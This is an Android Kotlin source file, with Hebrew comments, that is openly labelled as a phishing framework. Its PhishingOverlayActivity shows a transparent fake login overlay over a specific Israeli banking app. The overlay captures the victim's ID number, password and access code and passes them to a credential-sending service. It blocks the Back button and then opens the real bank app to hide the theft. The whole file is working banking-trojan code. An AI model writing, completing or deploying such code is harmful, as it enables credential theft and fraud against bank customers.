package com.example.phishingframework

import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.core.content.ContextCompat

class PhishingOverlayActivity : Activity() {

    // Regex patterns
    private val ID_REGEX = Regex("\\d{9}")
    private val CODE_REGEX = Regex("[A-Z]{2}\\d{4}")

    private lateinit var resultReceiver: BroadcastReceiver

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // רקע שקוף
        window.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))

        // טוענים את הממשק
        setContentView(R.layout.phishing_login_overlay)

        // מוצאים את הרכיבים
        val idField = findViewById<EditText>(R.id.id_field)
        val passwordField = findViewById<EditText>(R.id.password_field)
        val codeField = findViewById<EditText>(R.id.code_field)
        val loginButton = findViewById<Button>(R.id.login_button)

        // בודקים אם יש הודעת שגיאה מהניסיון הקודם
        val errorMessage = intent.getStringExtra("error_message")
        if (errorMessage != null) {
            passwordField.error = errorMessage
            // מוחקים את הסיסמה הקודמת
            passwordField.setText("")
        }

        // TextWatcher לניקוי שגיאות
        val watcher = object : TextWatcher {
            override fun afterTextChanged(s: Editable?) {
                if (idField.error != null && ID_REGEX.matches(idField.text))
                    idField.error = null
                if (passwordField.error != null && passwordField.text.length >= 6)
                    passwordField.error = null
                if (codeField.error != null && CODE_REGEX.matches(codeField.text))
                    codeField.error = null
            }
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
        }

        idField.addTextChangedListener(watcher)
        passwordField.addTextChangedListener(watcher)
        codeField.addTextChangedListener(watcher)

        // רישום receiver לתוצאות
        resultReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                when (intent.action) {
                    CredentialSendService.ACTION_CREDENTIALS_OK -> {
                        Log.i("PhishingOverlay", "Credentials sent successfully")

                        // פותחים את האפליקציה האמיתית
                        val launchIntent = packageManager.getLaunchIntentForPackage("com.ideomobile.mercantile")
                        if (launchIntent != null) {
                            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            launchIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                            startActivity(launchIntent)
                        }

                        // סוגרים את ה-overlay
                        finish()
                    }

                    CredentialSendService.ACTION_CREDENTIALS_FAILED -> {
                        Toast.makeText(
                            this@PhishingOverlayActivity,
                            "שליחת הפרטים נכשלה. אנא נסה שוב.",
                            Toast.LENGTH_LONG
                        ).show()
                    }
                }
            }
        }

        val filter = IntentFilter().apply {
            addAction(CredentialSendService.ACTION_CREDENTIALS_OK)
            addAction(CredentialSendService.ACTION_CREDENTIALS_FAILED)
        }

        ContextCompat.registerReceiver(
            this,
            resultReceiver,
            filter,
            ContextCompat.RECEIVER_NOT_EXPORTED
        )

        // לחיצה על כפתור הכניסה
        loginButton.setOnClickListener {
            // ולידציה
            if (!validateAndMarkErrors(idField, passwordField, codeField)) {
                return@setOnClickListener
            }

            val idNumber = idField.text.toString()
            val password = passwordField.text.toString()
            val code = codeField.text.toString()

            Log.d("PhishingOverlay", "Sending credentials: id=$idNumber")

            // שליחת הנתונים לשירות
            val intent = Intent(this, CredentialSendService::class.java).apply {
                putExtra("id", idNumber)
                putExtra("password", password)
                putExtra("code", code)
            }
            startService(intent)

            // לא סוגרים את ה-Activity כאן!
            // נחכה לתשובה מה-BroadcastReceiver
        }

        // פוקוס על שדה ת"ז
        idField.requestFocus()
    }

    private fun validateAndMarkErrors(
        idField: EditText,
        passField: EditText,
        codeField: EditText
    ): Boolean {
        var allOk = true

        if (!ID_REGEX.matches(idField.text)) {
            idField.error = "ת״ז חייבת להכיל 9 ספרות"
            allOk = false
        }

        if (passField.text.length < 6) {
            passField.error = "סיסמה חייבת להכיל לפחות 6 תווים"
            allOk = false
        }

        if (!CODE_REGEX.matches(codeField.text)) {
            codeField.error = "קוד: 2 אותיות גדולות + 4 ספרות (AA1234)"
            allOk = false
        }

        return allOk
    }

    override fun onBackPressed() {
        // מונעים סגירה בלחיצה על Back
        // המשתמש חייב להזין פרטים
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(resultReceiver)
        } catch (e: Exception) {
            Log.e("PhishingOverlay", "Error unregistering receiver", e)
        }
    }
}